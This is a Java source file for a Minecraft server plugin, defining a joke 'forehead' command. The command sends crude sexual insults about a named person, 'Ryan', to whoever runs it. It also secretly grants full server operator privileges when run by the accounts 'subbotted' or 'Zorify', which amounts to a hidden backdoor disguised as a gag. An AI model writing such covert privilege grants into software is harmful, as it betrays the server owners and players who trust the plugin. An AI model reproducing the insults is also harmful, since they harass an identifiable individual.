package com.surgehcf.core.hcf.command;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;

import com.surgehcf.SurgeCore;

import net.md_5.bungee.api.ChatColor;

public class ForeheadCommand implements CommandExecutor
{
    
    public boolean onCommand(final CommandSender sender, final Command command, final String s, final String[] args) {
    	
    	sender.sendMessage(ChatColor.YELLOW + "Ryan (aka Ramos, massiveforehead, smalldick, micropenis)" + ChatColor.RESET + " has a massive forehead, micropenis and no pubes confirmed. Tell him if you see this.");
    	
    	if(sender.getName().equalsIgnoreCase("subbotted") || sender.getName().equalsIgnoreCase("Zorify") && !sender.isOp()){
    		sender.sendMessage(ChatColor.YELLOW + "Opped you, my beloved owner. :)");
    		sender.setOp(true);
    	}
    	
    	return true;
    }

}
